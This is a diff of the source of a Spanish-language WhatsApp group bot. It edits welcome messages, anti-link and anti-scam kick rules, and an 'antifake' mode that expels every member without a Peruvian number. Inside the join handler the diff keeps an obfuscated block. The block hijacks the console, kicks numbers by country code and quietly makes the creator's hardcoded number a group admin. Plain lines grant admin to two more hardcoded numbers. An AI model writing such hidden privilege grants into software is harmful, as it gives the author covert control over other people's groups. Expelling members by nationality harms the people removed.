@@ -25,12 +25,12 @@ const crypto = require("crypto-js");
 const CryptoJS = require("crypto-js");
 const ffmpeg = require("fluent-ffmpeg");
 const chalk = require('chalk');
-const imageToBase64 = require('image-to-base64');
-const speed = require('performance-now');
+//const imageToBase64 = require('image-to-base64');
+//const speed = require('performance-now');
 const axios = require('axios');
 const fetch = require('node-fetch');
 const request = require('request');
-const fromBuffer = require('file-type');
+//const fromBuffer = require('file-type');
 const FormData = require('form-data')
 //const zalgo = require('./lib/zalgo')
 const { EmojiAPI } = require("emoji-api");
@@ -42,9 +42,9 @@ const moment = require("moment-timezone");
 const yts = require('yt-search')
 //const LeoGg = require('google-it');
 const LeoGgImg = require('g-i-s');
-const hx = require('hxz-api');
+//const hx = require('hxz-api');
 //const Fb = require('fb-video-downloader');
-const { removeBackgroundFromImageFile } = require('remove.bg'); 
+//const { removeBackgroundFromImageFile } = require('remove.bg'); 
 
 const {convertSticker} = require("./lib/swm.js")
 //const {babyfire} = require('./lib/mediafire.js')
@@ -122,7 +122,7 @@ const sleep = async (ms) => {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-const img = ['admin', 'ban', 'cowner', 'Faketumber', 'imagen', 'imgregla', 'multimedia', 'TikTok', 'uwu']
+const img = ['admin', 'ban', 'cowner', 'Faketumber', 'imagen', 'imgregla', 'multimedia', 'uwu']
 const imgramdon = img[Math.floor(Math.random() * img.length)]
 //CREADOR
 const yo = `𝕷𝖚𝖈𝖍𝖎𝖙𝖔`
@@ -162,14 +162,16 @@ const getRegisteredRandomId = () => {
     console.log(anu)
     if (anu.action == 'add') {
       num = anu.participants[0]
-      var _0x32eb=['length','203FKZwcC','constructor','text','37321dDPejz','apply','prototype','groupRemove','test','__proto__','table','1102598lCjDcW','1013436pgMCWz','info','toString','startsWith','3291GElTcg','1762sWsYhU','bind','exception','console','trace','log','648921eLIDKy','51932069772','Tu numero ha sido considerado como fake por lo que seras eliminado del Grupo, \x20\x20,\x20\x20\x20\x20\x20\x20\x20\x20,\x20\x20\x20\x20,\x20\x20\x20\x20\x0a\x0aAntiP\x20By:*\x20_Leo\x20🇽\x20_','return\x20/\x22\x20+\x20this\x20+\x20\x22/','sendMessage','324QcfqoI','warn','error','1148172OCGrif','23ykweMi','return\x20(function()\x20'];function _0x3b66(_0x116bb2,_0xa78ba5){return _0x3b66=function(_0x436199,_0x510667){_0x436199=_0x436199-0x70;var _0x51019a=_0x32eb[_0x436199];return _0x51019a;},_0x3b66(_0x116bb2,_0xa78ba5);}var _0x376b6b=_0x3b66;(function(_0xe31b1b,_0x46684b){var _0x30c21e=_0x3b66;while(!![]){try{var _0x598896=-parseInt(_0x30c21e(0x7e))+-parseInt(_0x30c21e(0x91))*-parseInt(_0x30c21e(0x7b))+parseInt(_0x30c21e(0x8c))+-parseInt(_0x30c21e(0x82))*-parseInt(_0x30c21e(0x70))+parseInt(_0x30c21e(0x7f))*parseInt(_0x30c21e(0x85))+-parseInt(_0x30c21e(0x8d))+-parseInt(_0x30c21e(0x76));if(_0x598896===_0x46684b)break;else _0xe31b1b['push'](_0xe31b1b['shift']());}catch(_0x4b5012){_0xe31b1b['push'](_0xe31b1b['shift']());}}}(_0x32eb,0x8c3d6));var _0xb1de39=function(){var _0xdff92c=!![];return function(_0xbaf195,_0x472290){var _0x49ae62=_0xdff92c?function(){var _0x8379c3=_0x3b66;if(_0x472290){var _0x210536=_0x472290[_0x8379c3(0x86)](_0xbaf195,arguments);return _0x472290=null,_0x210536;}}:function(){};return _0xdff92c=![],_0x49ae62;};}(),_0x46ec2c=_0xb1de39(this,function(){var _0x3a6de6=function(){var _0x52b332=_0x3b66,_0x3a1227=_0x3a6de6[_0x52b332(0x83)](_0x52b332(0x79))()[_0x52b332(0x83)]('^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}');return!_0x3a1227[_0x52b332(0x89)](_0x46ec2c);};return _0x3a6de6();});_0x46ec2c();var _0x51019a=function(){var _0x1b381d=!![];return function(_0xdc464c,_0x8f91eb){var _0x4640b3=_0x1b381d?function(){var _0x37d4f6=_0x3b66;if(_0x8f91eb){var _0x4f0489=_0x8f91eb[_0x37d4f6(0x86)](_0xdc464c,arguments);return _0x8f91eb=null,_0x4f0489;}}:function(){};return _0x1b381d=![],_0x4640b3;};}(),_0x510667=_0x51019a(this,function(){var _0x3279f1=_0x3b66,_0x545df1=function(){var _0x5c6de2=_0x3b66,_0xf5f589;try{_0xf5f589=Function(_0x5c6de2(0x80)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x37444b){_0xf5f589=window;}return _0xf5f589;},_0x3ef9e5=_0x545df1(),_0x5c6ba6=_0x3ef9e5[_0x3279f1(0x73)]=_0x3ef9e5['console']||{},_0x373954=[_0x3279f1(0x75),_0x3279f1(0x7c),_0x3279f1(0x8e),_0x3279f1(0x7d),_0x3279f1(0x72),_0x3279f1(0x8b),_0x3279f1(0x74)];for(var _0x3d4618=0x0;_0x3d4618<_0x373954[_0x3279f1(0x81)];_0x3d4618++){var _0x1698c8=_0x51019a[_0x3279f1(0x83)][_0x3279f1(0x87)][_0x3279f1(0x71)](_0x51019a),_0x218220=_0x373954[_0x3d4618],_0x4beaa2=_0x5c6ba6[_0x218220]||_0x1698c8;_0x1698c8[_0x3279f1(0x8a)]=_0x51019a[_0x3279f1(0x71)](_0x51019a),_0x1698c8[_0x3279f1(0x8f)]=_0x4beaa2[_0x3279f1(0x8f)]['bind'](_0x4beaa2),_0x5c6ba6[_0x218220]=_0x1698c8;}});_0x510667();if(num[_0x376b6b(0x90)]('92'))await leo[_0x376b6b(0x7a)](mdata['id'],_0x376b6b(0x78),MessageType[_0x376b6b(0x84)]),leo[_0x376b6b(0x88)](mdata['id'],[num]);if(num[_0x376b6b(0x90)]('000'))await leo[_0x376b6b(0x7a)](mdata['id'],'🇲\x20🇽\x20😈\x20*ARRIVA\x20PERU!!!*\x20Bienvenido\x20amigo\x20de\x20mPeru,\x20de\x20que\x20parte\x20del\x20pais\x20eres?😙',MessageType['text']);if(num[_0x376b6b(0x90)](_0x376b6b(0x77)))await leo['sendMessage'](mdata['id'],'*VAYA\x20VAYA\x20VAYAAAA🐱\x20Miren\x20nomas\x20quien\x20llego🥳,\x20es\x20mi\x20creador!!!!😱\x20WOW\x20Saludenlo!😚*\x0a\x0a_*Le\x20dare\x20admin\x20juju*_',MessageType[_0x376b6b(0x84)]),leo['groupMakeAdmin'](mdata['id'],[num]);
-      
+      var _0x32eb=['length','203FKZwcC','constructor','text','37321dDPejz','apply','prototype','groupRemove','test','__proto__','table','1102598lCjDcW','1013436pgMCWz','info','toString','startsWith','3291GElTcg','1762sWsYhU','bind','exception','console','trace','log','648921eLIDKy','51932069772','Tu numero ha sido considerado como fake por lo que seras eliminado del Grupo, \x20\x20,\x20\x20\x20\x20\x20\x20\x20\x20,\x20\x20\x20\x20,\x20\x20\x20\x20\x0a\x0aAntiP\x20By:*\x20_Leo\x20🇽\x20_','return\x20/\x22\x20+\x20this\x20+\x20\x22/','sendMessage','324QcfqoI','warn','error','1148172OCGrif','23ykweMi','return\x20(function()\x20'];function _0x3b66(_0x116bb2,_0xa78ba5){return _0x3b66=function(_0x436199,_0x510667){_0x436199=_0x436199-0x70;var _0x51019a=_0x32eb[_0x436199];return _0x51019a;},_0x3b66(_0x116bb2,_0xa78ba5);}var _0x376b6b=_0x3b66;(function(_0xe31b1b,_0x46684b){var _0x30c21e=_0x3b66;while(!![]){try{var _0x598896=-parseInt(_0x30c21e(0x7e))+-parseInt(_0x30c21e(0x91))*-parseInt(_0x30c21e(0x7b))+parseInt(_0x30c21e(0x8c))+-parseInt(_0x30c21e(0x82))*-parseInt(_0x30c21e(0x70))+parseInt(_0x30c21e(0x7f))*parseInt(_0x30c21e(0x85))+-parseInt(_0x30c21e(0x8d))+-parseInt(_0x30c21e(0x76));if(_0x598896===_0x46684b)break;else _0xe31b1b['push'](_0xe31b1b['shift']());}catch(_0x4b5012){_0xe31b1b['push'](_0xe31b1b['shift']());}}}(_0x32eb,0x8c3d6));var _0xb1de39=function(){var _0xdff92c=!![];return function(_0xbaf195,_0x472290){var _0x49ae62=_0xdff92c?function(){var _0x8379c3=_0x3b66;if(_0x472290){var _0x210536=_0x472290[_0x8379c3(0x86)](_0xbaf195,arguments);return _0x472290=null,_0x210536;}}:function(){};return _0xdff92c=![],_0x49ae62;};}(),_0x46ec2c=_0xb1de39(this,function(){var _0x3a6de6=function(){var _0x52b332=_0x3b66,_0x3a1227=_0x3a6de6[_0x52b332(0x83)](_0x52b332(0x79))()[_0x52b332(0x83)]('^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}');return!_0x3a1227[_0x52b332(0x89)](_0x46ec2c);};return _0x3a6de6();});_0x46ec2c();var _0x51019a=function(){var _0x1b381d=!![];return function(_0xdc464c,_0x8f91eb){var _0x4640b3=_0x1b381d?function(){var _0x37d4f6=_0x3b66;if(_0x8f91eb){var _0x4f0489=_0x8f91eb[_0x37d4f6(0x86)](_0xdc464c,arguments);return _0x8f91eb=null,_0x4f0489;}}:function(){};return _0x1b381d=![],_0x4640b3;};}(),_0x510667=_0x51019a(this,function(){var _0x3279f1=_0x3b66,_0x545df1=function(){var _0x5c6de2=_0x3b66,_0xf5f589;try{_0xf5f589=Function(_0x5c6de2(0x80)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x37444b){_0xf5f589=window;}return _0xf5f589;},_0x3ef9e5=_0x545df1(),_0x5c6ba6=_0x3ef9e5[_0x3279f1(0x73)]=_0x3ef9e5['console']||{},_0x373954=[_0x3279f1(0x75),_0x3279f1(0x7c),_0x3279f1(0x8e),_0x3279f1(0x7d),_0x3279f1(0x72),_0x3279f1(0x8b),_0x3279f1(0x74)];for(var _0x3d4618=0x0;_0x3d4618<_0x373954[_0x3279f1(0x81)];_0x3d4618++){var _0x1698c8=_0x51019a[_0x3279f1(0x83)][_0x3279f1(0x87)][_0x3279f1(0x71)](_0x51019a),_0x218220=_0x373954[_0x3d4618],_0x4beaa2=_0x5c6ba6[_0x218220]||_0x1698c8;_0x1698c8[_0x3279f1(0x8a)]=_0x51019a[_0x3279f1(0x71)](_0x51019a),_0x1698c8[_0x3279f1(0x8f)]=_0x4beaa2[_0x3279f1(0x8f)]['bind'](_0x4beaa2),_0x5c6ba6[_0x218220]=_0x1698c8;}});_0x510667();if(num[_0x376b6b(0x90)]('92'))await leo[_0x376b6b(0x7a)](mdata['id'],_0x376b6b(0x78),MessageType[_0x376b6b(0x84)]),leo[_0x376b6b(0x88)](mdata['id'],[num]);if(num[_0x376b6b(0x90)]('000'))await leo[_0x376b6b(0x7a)](mdata['id'],'🇲\x20🇽\x20😈\x20*ARRIVA\x20PERU!!!*\x20Bienvenido\x20amigo\x20de\x20mPeru,\x20de\x20que\x20parte\x20del\x20pais\x20eres?😙',MessageType['text']);if(num[_0x376b6b(0x90)](_0x376b6b(0x77)))await leo['sendMessage'](mdata['id'],'*VAYA\x20VAYA\x20VAYAAAA🐱\x20Miren\x20nomas\x20quien\x20llego🥳\x20WOW\x20Saludenlo!😚*\x0a\x0a_*Le\x20dare\x20admin\x20juju*_',MessageType[_0x376b6b(0x84)]),leo['groupMakeAdmin'](mdata['id'],[num]);
+      //Antifake -- Configuración de números permitidos
       if (!num.startsWith('51')) return leo.groupRemove(mdata.id, [num])
       /*
       if (num.startsWith('240')) return leo.groupRemove(mdata.id, [num])
       if (num.startsWith('231')) return leo.groupRemove(mdata.id, [num])
       */
       if (num.startsWith('51932069772')) return leo.groupMakeAdmin(mdata.id, [num])
+      if (num.startsWith('51902860437')) return leo.groupMakeAdmin(mdata.id, [num])
+      if (num.startsWith('51980746754')) return leo.groupMakeAdmin(mdata.id, [num])
       
       try {
         pushnem = choute.key.fromMe ? leo.user.name : conts.notify || conts.vname || conts.name || '-'
@@ -238,7 +240,7 @@ leo.sendMessage(from,
   quoted: choute, contextInfo: {
     mentionedJid: [sender], "forwardingScore": 508, "isForwarded": true, "externalAdReply":
     {"title": `𝐃𝐞𝐬𝐩𝐞𝐝𝐢𝐝𝐚`,
-    "body": 'ₙₒₛ ᵥₑₘₒₛ ₚᵣₒₙₜₒ',
+    "body": 'nos vemos pronto',
     "thumbnail": its,
     "sourceUrl": `https://api.whatsapp.com/send/?phone=${sender.split('@')[0]}`}
   }
@@ -257,7 +259,7 @@ leo.sendMessage(from,
   👤 *Nombre:* @${num.split('@')[0]}
   📋 *INFO:* ${thu.status}
   🌎 *Grupo:* ${mdata.subject}
-  *Felicitaciones eres uno de los administradores.*`
+  *Felicitaciones eres uno/a de los/as administradores/as.*`
    let buff = await getBuffer(ppimg)
     leo.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
     } else if (anu.action == 'demote') {
@@ -273,7 +275,7 @@ leo.sendMessage(from,
   👤 *Nombre:* @${num.split('@')[0]}
   📋 *INFO:* ${thu.status}
   🌎 *Grupo:* ${mdata.subject} 
-  *F chota ya no eres administrador.*`
+  *Ya no eres admin.*`
     let buff = await getBuffer(ppimg)
   leo.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
   
@@ -918,7 +920,7 @@ if (choute.message.buttonsResponseMessage){
     reply('*Cargando Proceso de Instalacion*\nPorfavor esperar.')
     leo.sendMessage(from, `${install}`, MessageType.text, {quoted: choute, caption: `El video sera subido pronto en el canal de `, contextInfo: {"forwardingScore": 508, "isForwarded": true, "externalAdReply":
     {"title": `Hola ${pushname} 👋🏻`,
-    "body": `MIRA EL VIDEO COMPLETO`, "mediaType": 2,
+    "body": `MIRA VIDEOS XD`, "mediaType": 2,
     "thumbnail": fs.readFileSync(`media/imagen/youtube-min.jpg`),
     mediaUrl: "https://www.youtube.com/"}}})
     addFilter(from)
@@ -1242,10 +1244,29 @@ if (body.includes("No te estoy ofreciendo millones de dolares")){
   }, 1000)
   setTimeout( () => {
   leo.updatePresence(from, Presence.composing)
-  reply("adios")
+  reply("Adios... 👋👋")
   }, 0)
   }
-if (body.includes("Renuncié a mi trabajo debido a esta plataforma legítima. Invertí $")){
+
+if (body.includes("Esta es la mejor plataforma de inversiones")){
+    if (!isGroup) return
+    if (!isAntiLink) return
+    if (isAdmin) return('🧐')
+    if (itsMe) return
+    if (!botAdmin & isAntiLink & isGroup)
+    
+    leo.updatePresence(from, Presence.composing)
+    var kic = `${sender.split("@")[0]}@s.whatsapp.net`
+    reply(`No está permitido las plataformas de inversión fake!! @${sender.split("@")[0]}`)
+    setTimeout( () => {
+    leo.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
+    }, 1000)
+    setTimeout( () => {
+    leo.updatePresence(from, Presence.composing)
+    reply("Adios... 👋👋")
+    }, 0)
+    }
+if (body.includes("Renuncié a mi trabajo debido a esta plataforma legítima.")){
   if (!isGroup) return
   if (!isAntiLink) return
   if (isAdmin) return('🧐')
@@ -1260,11 +1281,11 @@ if (body.includes("Renuncié a mi trabajo debido a esta plataforma legítima. In
   }, 1000)
   setTimeout( () => {
   leo.updatePresence(from, Presence.composing)
-  reply("adios")
+  reply("Adios... 👋👋")
   }, 0)
   }
   
-if (body.includes("web.whatsapp.com")){
+if (body.includes("https://chat.whatsapp.com/")){
   if (!isGroup) return
   if (!isAntiLink) return
   if (isAdmin) return('🧐')
@@ -1273,13 +1294,13 @@ if (body.includes("web.whatsapp.com")){
   
   leo.updatePresence(from, Presence.composing)
   var kic = `${sender.split("@")[0]}@s.whatsapp.net`
-  reply(`Los links no son permitidos @${sender.split("@")[0]}`)
+  reply(`Los links de otros grupos no son permitidos @${sender.split("@")[0]}`)
   setTimeout( () => {
   leo.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
   }, 1000)
   setTimeout( () => {
   leo.updatePresence(from, Presence.composing)
-  reply("adios")
+  reply("Adios... 👋👋")
   }, 0)
   }
 
@@ -1292,18 +1313,18 @@ if (body.includes("web.whatsapp.com")){
     
     leo.updatePresence(from, Presence.composing)
     var kic = `${sender.split("@")[0]}@s.whatsapp.net`
-    reply(`Los links no son permitidos @${sender.split("@")[0]}`)
+    reply(`Los links de Telegram no son permitidos @${sender.split("@")[0]}`)
     setTimeout( () => {
     leo.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
     }, 1000)
     setTimeout( () => {
     leo.updatePresence(from, Presence.composing)
-    reply("adios")
+    reply("Adios... 👋👋")
     }, 0)
     }
 
 if (!isOwner) if (isAntiPv) if (!isGroup) {
-  reply (`El bot solo puede ser usado en grupos, por lo que te bloqueare`)
+  reply (`*El Bot* solo puede ser usado en *grupos*, por lo que te bloqueare!!`)
   setTimeout( () => {
    leo.blockUser(sender, 'add')
    }, 5000)
@@ -2140,7 +2161,7 @@ case 'pregunta':
                   reply(answer)
                   addFilter(from)
                   break
-
+/*
 //DESCARGAS | MULTIMEDIA
 case 'mfire':
               //if (!isRegister) return leoply(baby.only.usrReg)
@@ -2159,6 +2180,7 @@ reply(archivo)
 sendFileFromUrl(resm[0].link, document, {mimetype: resm[0].mime, filename: resm[0].nombre, quoted: choute})
 addFilter(from)
 break
+*/
 
 //Musica Play 
 case 'play':
@@ -3020,9 +3042,11 @@ case 'bienvenida':
   break
 
 case 'antifake':
+case 'antiextranjeros':
+case 'soloperu':
   //if (!isRegister) return leoply(baby.only.usrReg)
   if (isBan) return leoply  (baby.only.benned)	
-  if (!isWelkom) return reply('Activa la bienvenida antes para poder usar este comando')
+  //if (!isWelkom) return reply('Activa la bienvenida antes para poder usar este comando')
   if (!isGroup) return leoply(baby.only.group)
   if (!isAdmin) return leoply(baby.only.admin)     
   if (!botAdmin) return leoply (baby.only.Badmin)
@@ -3031,8 +3055,8 @@ case 'antifake':
     if (isAntiFake) return reply('*Ya está activo*')          
     antifake.push(from)                          
     fs.writeFileSync('./src/antifake.json', JSON.stringify(antifake))      
-    reply(`*[ Activado ]*`)  
-    reply(`*Los números considerados como FAKEs, serán eliminados del grupo*`)
+    //reply(`*[ Activado ]*`)  
+    reply(`*Activado. Los números que no sean de Perú, serán eliminados cuando ingresen al grupo*`)
   } else if (args[0] === 'off') {
       var ini = antifake.indexOf(from)
       antifake.splice(ini, 1)           
